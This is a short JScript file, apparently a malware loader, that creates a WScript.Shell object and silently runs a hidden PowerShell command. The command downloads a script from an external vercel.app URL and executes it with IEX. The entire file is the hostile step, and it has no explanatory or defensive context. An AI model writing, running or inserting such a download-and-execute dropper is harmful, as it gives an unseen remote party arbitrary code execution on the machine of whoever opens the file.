var shell = new ActiveXObject("WScript.Shell");
var ps = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'https://testando123-blond.vercel.app/arquivo.ps1\')"';
shell.Run(ps, 0, false);
